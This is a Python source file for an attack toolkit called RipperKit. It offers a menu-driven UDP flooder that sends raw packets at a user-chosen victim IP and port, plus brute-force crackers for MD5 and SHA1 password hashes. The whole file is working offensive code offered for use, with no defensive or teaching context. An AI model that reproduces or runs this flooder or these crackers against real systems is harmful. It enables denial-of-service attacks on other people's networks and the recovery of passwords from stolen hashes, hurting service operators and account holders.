#-*-coding: utf8-*-

#   Author:         Jéssica
#   Github:         @Estuqui
#   Official Repo:  https://github.com/Estuqui/RipperKit

# Imports
import sys, requests, time, socket, random, os
from hashlib import md5, sha1, sha256, sha512
from itertools import product
from colorama import init as Colors, Fore, Back, Style

# Init colorama
Colors()

# Banner
banner = ""
banner += " ██▀███   ██▓ ██▓███   ██▓███  ▓█████  ██▀███  \n"
banner += "▓██ ▒ ██▒▓██▒▓██░  ██▒▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒\n"
banner += "▓██ ░▄█ ▒▒██▒▓██░ ██▓▒▓██░ ██▓▒▒███   ▓██ ░▄█ ▒\n"
banner += "▒██▀▀█▄  ░██░▒██▄█▓▒ ▒▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄  \n"
banner += "░██▓ ▒██▒░██░▒██▒ ░  ░▒██▒ ░  ░░▒████▒░██▓ ▒██▒\n"
banner += "░ ▒▓ ░▒▓░░▓  ▒▓▒░ ░  ░▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░\n"
banner += "  ░▒ ░ ▒░ ▒ ░░▒ ░     ░▒ ░      ░ ░  ░  ░▒ ░ ▒░\n"
banner += "  ░░   ░  ▒ ░░░       ░░          ░     ░░   ░ \n"
banner += "   ░      ░                       ░  ░   ░     \n"

# Menu index and options
menu_index = 0
menu_text = ""
menu_text += "[1] - UDP Flooder\n"
menu_text += "[2] - Crack MD5 Hash\n"
menu_text += "[3] - Crack SHA1 Hash\n"
menu_text += "[99] - Exit\n"

# Function main
def main():
    print(Fore.RED + banner)
    print(Fore.GREEN + menu_text)

    menu_index = input("ripper@root: ")

    while True:
        if(menu_index == "1"):
            UDPFlooder()
            break
        elif(menu_index == "2"):
            MD5Crack()
            break
        elif(menu_index == "3"):
            SHA1Crack()
            break
        elif(menu_index == "99"):
            exit()
            break
        else:
            print("Invalid option")
            break

# UDP Flooder Function
def UDPFlooder():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
    packet_data = '0C 00 6F 03 7C 0E 9C 8F 38 10 03 95 DD 86' 
    victim_ip = '127.0.0.1' 
    attack_port = 7171 
    cur = 0
    sent = 0 
    standard_time = time.time()
    timer = 60

    victim_ip = input('ripper@root [Target IP]: ')
    attack_port = input('ripper@root [Enter port (1-65535)]: ')

    reply = input('ripper@root [Use custom PCK? (y/n)]: ')
    if(reply == 'y'):
        packet_data = input("ripper@root [Enter PCK (HEX Format)]: ")        

    npcks = input("ripper@root [Amout of packets to send]: ")
    reply = input('\nPress [ENTER] to start')

    while(cur < int(npcks)): 
        end = time.time()
        if(end - standard_time < 60):
            sock.sendto(bytes.fromhex(packet_data), (victim_ip, int(attack_port)))
            sent = sent + 1
            print('ripper@root [Sent: ',sent,' packets to ', victim_ip,']')
            cur = cur + 1
            
    print("ripper@root: Task complete!")
    reply = input('\nPress [ENTER] to return to menu')
    main()

# Function crack MD5
def MD5Crack():
	alphabet = "0123456789abcdefghijklmnopqrstuvxzywABCDEFGHIJKLMNOPQRSTUVXZYW"
	strhash = input("ripper@root [MD5 hash to crack]: ")
	reply = input("ripper@root [Include symbols? (y/n)]: ")
	if(reply == "y"):
		alphabet += "!@#$%&*()_-=+';:.,]}{[|^~º?"

	starttime = time.time()
	for n in range(1, 18 + 1):
		for xs in product(alphabet, repeat=n):
			string=''.join(xs)
			password = md5(string.encode('utf-8')).hexdigest()
            
			if strhash == password:
				final = time.time() - starttime
				print (Fore.LIGHTCYAN_EX + "\nripper@root: [+] Cracked => %s"%(string))
				print (Fore.LIGHTCYAN_EX + "ripper@root: [+] Duration => %i seconds\n"%(final))
				reply = input(Fore.GREEN + "Press [ENTER] to return menu.\n\n")
				main()
			else:
				print (Fore.RED + "ripper@root: [-] Fail => %s" % (string))

	final = time.time() - starttime
	print ("\nripper@root: [+] Duration => %i seconds\n"%(final))
	main()

# Function crack SHA1
def SHA1Crack():
	alphabet = "0123456789abcçdefghijklmnopqrstuvxzywABCÇDEFGHIJKLMNOPQRSTUVXZYW"
	strhash = input("ripper@root [SHA1 hash to crack]: ")
	reply = input("ripper@root [Include symbols? (y/n)]: ")
	if(reply == "y"):
		alphabet += "!@#$%&*()_-=+';:.,]}{[|^~º?"

	starttime = time.time()
	for n in range(1, 18 + 1):
		for xs in product(alphabet, repeat=n):
			string=''.join(xs)
			password = sha1(string.encode('utf-8')).hexdigest()
            
			if strhash == password:
				final = time.time() - starttime
				print (Fore.LIGHTCYAN_EX + "\nripper@root: [+] Cracked => %s"%(string))
				print (Fore.LIGHTCYAN_EX + "ripper@root: [+] Duration => %i seconds\n"%(final))
				reply = input(Fore.GREEN + "Press [ENTER] to return menu.\n\n")
				main()
			else:
				print (Fore.RED + "ripper@root: [-] Fail => %s" % (string))

	final = time.time() - starttime
	print ("\nripper@root: [+] Duration => %i seconds\n"%(final))
	main()

# Init Function
if __name__ == "__main__":
	main()
